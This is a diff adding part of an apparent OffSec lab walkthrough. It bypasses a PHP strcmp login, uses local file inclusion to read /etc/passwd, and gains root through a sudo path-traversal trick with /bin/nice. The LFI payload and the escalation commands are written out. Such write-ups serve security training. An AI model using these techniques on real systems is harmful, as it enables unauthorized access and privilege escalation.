@@ -107,6 +107,41 @@ DOWNLOADED: 9224 - FOUND: 3
 - In index.php.bak , username and pass field has been check by strcmp
 
 ## Exploiting strcmp
+https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
+- Taking this as reference, to bypass the strcmp using NULL==0
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/6a2c8f86-76f0-449c-a22d-149396c19367)
+
+- Now we can able to access the admin dashboard
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/1b2da290-63b2-4e04-9da9-dfeb70b20411)
+
+- In the logs page, there is a file parameter passing, so tried LFI `../../../../../etc/passwd`
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/5813f3ae-b034-4b55-ae2b-406596c68390)
+
+- Try nano to paste the hash, don't echo , because of $ sign 
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/cb810238-4347-4421-9001-585c79abc548)
+
+## SSH - Local user flagged
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/b036a2a2-5bcb-4e49-ac79-f716d52126cb)
+
+- That `/bin/nice /notes/*` --> * -->> {we can give any path to run as sudo}
+- So created a file to take shell with root premission
+
+```
+cd ~
+echo /bin/bash > shell.sh
+sudo /bin/nice /notes/../home/webadmin/shell.sh
+```
+
+## Root user flagged
+
+- This gives root shell
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/3c559eb9-899c-4f6a-a17a-c44ce32ef413)
+
+
+
 
 
 
